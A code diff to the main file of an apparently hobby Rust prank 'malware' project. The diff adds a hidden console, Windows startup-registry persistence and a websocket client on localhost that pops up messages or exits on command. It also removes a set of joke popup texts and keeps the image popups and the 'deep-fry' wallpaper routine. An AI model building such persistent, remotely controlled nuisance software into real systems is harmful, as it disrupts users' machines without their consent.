@@ -1,6 +1,8 @@
+#![windows_subsystem = "windows"]
 use std::{
     path::Path,
-    collections::HashMap
+    collections::HashMap,
+    process
 };
 use std::thread;
 use std::time::Duration;
@@ -11,10 +13,21 @@ mod utils;
 mod popups;
 mod kill_process;
 mod persistence;
+mod websocket_client;
 
 fn main() {
     /* Adds our malware to the list of windows startup apps */
     persistence::add_startup_windows_registry();
+
+    /* Start our websockets client; only supports ws because I'm lazy */
+    let client = websocket_client::WebSocketClient::new("ws://localhost:8765", |message| {
+        if message == "stop" {
+            process::exit(0);
+        } else {
+            popups::popup_message(&message)
+        }
+    });
+    let _handle = client.start();
 
     let iterations: usize = 240;
 
@@ -29,7 +42,7 @@ fn main() {
 
     for (filepath, resource_id) in &images {
         /* Extract image from PE to filesystem */
-        wallpaper::extract_image_to_filesystem(
+        utils::extract_resource_to_filesystem(
             resource_id,
             &Path::new(filepath)
         );
@@ -51,18 +64,6 @@ fn main() {
     });
 
     thread::spawn(move || {
-        let messages = vec![
-            "Warning: Nick needs a pizza".to_string(),
-            "Nick is hungry".to_string(),
-            "Dominos > Papa Johns".to_string(),
-            "I know where you live".to_string(),
-            "No pizza = System shutdown imminent".to_string(),
-        ];
-
-        popups::popup_messages_randomly(messages, iterations, 3000, 10000);
-    });
-
-    thread::spawn(move || {
         popups::popup_images_randomly(image_paths, iterations, 3000, 10000);
     });
 
@@ -76,15 +77,14 @@ fn main() {
     });
 
     /* load the image for deep frying */
-    let mut img = image::open(&chef_path).expect("Error: failed to load image!");
+    let img = image::open(&chef_path).expect("Error: failed to load image!");
 
     /* deep fry loop */
-    let mut intensity = 0.0;
+    let mut intensity;
     let max_intensity = 1.0;
     let steps = 60;
 
     for i in 1..=steps {
-        println!("entering loop");
         /* calculate current intensity based on current iteration */
         intensity = (i as f32) / (steps as f32) * max_intensity;
 
